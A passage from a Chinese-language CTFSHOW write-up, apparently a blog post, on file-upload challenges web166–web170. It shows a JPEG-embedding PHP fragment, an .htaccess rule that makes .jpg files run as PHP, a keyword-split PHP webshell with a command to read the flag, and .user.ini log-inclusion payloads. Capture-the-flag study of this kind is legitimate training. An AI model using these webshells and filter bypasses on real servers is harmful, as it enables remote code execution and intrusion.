+</span></span><span class="line"><span class="ln">100</span><span class="cl">        <span class="nx">imagecreatefromjpeg</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">101</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$unlink</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">102</span><span class="cl">            <span class="nx">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">103</span><span class="cl">        <span class="k">return</span> <span class="nv">$correctImage</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">104</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">105</span><span class="cl">
+</span></span><span class="line"><span class="ln">106</span><span class="cl">    <span class="k">function</span> <span class="nf">custom_error_handler</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$errfile</span><span class="p">,</span> <span class="nv">$errline</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">107</span><span class="cl">        <span class="k">global</span> <span class="nv">$extraBytes</span><span class="p">,</span> <span class="nv">$correctImage</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">108</span><span class="cl">        <span class="nv">$correctImage</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">109</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/(\d+) extraneous bytes before marker/&#39;</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$m</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">110</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">111</span><span class="cl">                <span class="nv">$extraBytes</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln">112</span><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="ln">113</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln">114</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">115</span><span class="cl">
+</span></span><span class="line"><span class="ln">116</span><span class="cl">    <span class="k">class</span> <span class="nc">DataInputStream</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">117</span><span class="cl">        <span class="k">private</span> <span class="nv">$binData</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">118</span><span class="cl">        <span class="k">private</span> <span class="nv">$order</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">119</span><span class="cl">        <span class="k">private</span> <span class="nv">$size</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">120</span><span class="cl">
+</span></span><span class="line"><span class="ln">121</span><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$order</span> <span class="o">=</span> <span class="k">false</span><span class="p">,</span> <span class="nv">$fromString</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">122</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">123</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">order</span> <span class="o">=</span> <span class="nv">$order</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">124</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$fromString</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">125</span><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span>
+</span></span><span class="line"><span class="ln">126</span><span class="cl">                    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;File not exists [&#39;</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">&#39;]&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">127</span><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">128</span><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">129</span><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">130</span><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="ln">131</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">size</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">132</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln">133</span><span class="cl">
+</span></span><span class="line"><span class="ln">134</span><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">seek</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">135</span><span class="cl">            <span class="k">return</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">size</span> <span class="o">-</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">));</span>
+</span></span><span class="line"><span class="ln">136</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln">137</span><span class="cl">
+</span></span><span class="line"><span class="ln">138</span><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">skip</span><span class="p">(</span><span class="nv">$skip</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">139</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="nv">$skip</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">140</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln">141</span><span class="cl">
+</span></span><span class="line"><span class="ln">142</span><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">readByte</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">143</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">144</span><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;End Of File&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">145</span><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="ln">146</span><span class="cl">            <span class="nv">$byte</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">147</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">148</span><span class="cl">            <span class="k">return</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$byte</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">149</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln">150</span><span class="cl">
+</span></span><span class="line"><span class="ln">151</span><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">readShort</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">152</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">153</span><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;End Of File&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">154</span><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="ln">155</span><span class="cl">            <span class="nv">$short</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">156</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">157</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">order</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">158</span><span class="cl">                <span class="nv">$short</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="ln">159</span><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">160</span><span class="cl">                <span class="nv">$short</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="ln">161</span><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="ln">162</span><span class="cl">            <span class="k">return</span> <span class="nv">$short</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">163</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln">164</span><span class="cl">
+</span></span><span class="line"><span class="ln">165</span><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">eof</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">166</span><span class="cl">            <span class="k">return</span> <span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="o">||</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">167</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln">168</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">169</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>jpg图片比较脆弱，成功率很低，我试了十多张图片都没成功</p>
+<h4 id="web166">web166<a hidden class="anchor" aria-hidden="true" href="#web166">#</a></h4>
+<p>zip注入</p>
+<p>这题只能上传zip，上传后会出现查看文件，存在文件包含</p>
+<p>本质上就是利用文件包含执行我们的恶意代码</p>
+<p><img alt="image-20250128184205535" loading="lazy" src="../assets/image-20250128184205535.png"></p>
+<h4 id="web167">web167<a hidden class="anchor" aria-hidden="true" href="#web167">#</a></h4>
+<p>.htaccess文件利用</p>
+<blockquote>
+<p>什么是.htaccess？</p>
+<p>htaccess文件是<a href="https://baike.baidu.com/item/Apache/0?fromModule=lemma_inlink">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页<a href="https://baike.baidu.com/item/301%E9%87%8D%E5%AE%9A%E5%90%91/1135400?fromModule=lemma_inlink">301重定向</a>、自定义<a href="https://baike.baidu.com/item/404%E9%94%99%E8%AF%AF%E9%A1%B5%E9%9D%A2/583066?fromModule=lemma_inlink">404错误页面</a>、改变<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D/1270230?fromModule=lemma_inlink">文件扩展名</a>、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p></blockquote>
+<p>如果服务器开启了.htaccess，那我们就可以利用.htaccess将jpg或者png等后缀的文件，作为php文件解析</p>
+<pre tabindex="0"><code>AddType/AddHandler application/x-httpd-php &#34;.jpg&#34;
+</code></pre><p>由于有前端验证，我们要先把编写好的.htaccess文件改为.jpg后缀</p>
+<p>再通过抓包将文件名修改为.htaccess</p>
+<p><img alt="image-20250129181407357" loading="lazy" src="../assets/image-20250129181407357.png"></p>
+<p>接着上传我们写好的一句话木马(后缀为.jpg)</p>
+<p><img alt="image-20250129181144016" loading="lazy" src="../assets/image-20250129181144016.png"></p>
+<p><img alt="image-20250129181548565" loading="lazy" src="../assets/image-20250129181548565.png"></p>
+<p>可以看到我们的一句话木马已经被成功执行了</p>
+<h4 id="web168">web168<a hidden class="anchor" aria-hidden="true" href="#web168">#</a></h4>
+<p>基础免杀</p>
+<p><img alt="image-20250129233605531" loading="lazy" src="../assets/image-20250129233605531.png"></p>
+<p>这题没有限制文件类型，可以上传php</p>
+<p>应该是对关键词有过滤</p>
+<p><img alt="image-20250129235142888" loading="lazy" src="../assets/image-20250129235142888.png"></p>
+<p>简单拼接一下试试，没想到直接成功了</p>
+<p>payload</p>
+<pre tabindex="0"><code>&lt;?php $a=&#34;sys&#34;.&#34;tem&#34;; $a($_REQUEST[1]);?
+</code></pre><pre tabindex="0"><code>GET 1=tac%20../flagaa.php
+</code></pre><h4 id="web169">web169<a hidden class="anchor" aria-hidden="true" href="#web169">#</a></h4>
+<p>.user.ini文件包含</p>
+<p><strong>前端做了校验只能传<code>zip</code>文件,后端又做了图片文件检查(需要改成image/png).过滤了<code>&lt;&gt;</code>和<code>php</code></strong></p>
+<p><strong>先上传一个<code>index.php</code>，然后利用日志包含，上传<code>.user.ini</code> 写入以下内容进行包含然后<code>UA</code>里面写木马</strong></p>
+<pre tabindex="0"><code>auto_append_file=&#34;/var/log/nginx/access.log&#34;
+
+&lt;?=system(&#39;cat ../flagaa.php&#39;)?&gt;
+</code></pre><p><img alt="image-20250130090337705" loading="lazy" src="../assets/image-20250130090337705.png"></p>
+<h4 id="web170">web170<a hidden class="anchor" aria-hidden="true" href="#web170">#</a></h4>
+<p>这题和web169解法一样，也是可以进行日志包含</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
+      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
+      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>CTFSHOW-文件包含-Writeup</span>
+  </a>
+  <a class="next" href="http://localhost:1313/post/ctfshow/ctfshow_%E7%88%86%E7%A0%B4/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>CTFSHOW-爆破-Writeup</span>
+  </a>
+</nav>
+
+  </footer><div id="tw-comment"></div>
+<script>
+    
+    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
+    const setGiscusTheme = () => {
+        const sendMessage = (message) => {
+            const iframe = document.querySelector('iframe.giscus-frame');
+            if (iframe) {
+                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
+            }
+        }
+        sendMessage({setConfig: {theme: getStoredTheme()}})
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+        const giscusAttributes = {
+            "src": "https://giscus.app/client.js",
+            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
+            "data-repo-id": "xxxxxx",
+            "data-category": "Announcements",
+            "data-category-id": "xxxxx",
+            "data-mapping": "pathname",
+            "data-strict": "0",
+            "data-reactions-enabled": "1",
+            "data-emit-metadata": "0",
+            "data-input-position": "bottom",
+            "data-theme": getStoredTheme(),
+            "data-lang": "zh-CN",
+            "data-loading": "lazy",
+            "crossorigin": "anonymous",
+        };
+
+        
+        const giscusScript = document.createElement("script");
+        Object.entries(giscusAttributes).forEach(
+                ([key, value]) => giscusScript.setAttribute(key, value));
+        document.querySelector("#tw-comment").appendChild(giscusScript);
+
+        
+        const themeSwitcher = document.querySelector("#theme-toggle");
+        if (themeSwitcher) {
+            themeSwitcher.addEventListener("click", setGiscusTheme);
+        }
+        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
+        if (themeFloatSwitcher) {
+            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
+        }
+    });
+</script>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 
+
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+    <div class="busuanzi-footer">
+        <span id="busuanzi_container_site_pv">Site Visits：<span id="busuanzi_value_site_pv"></span></span>
+    </div></footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
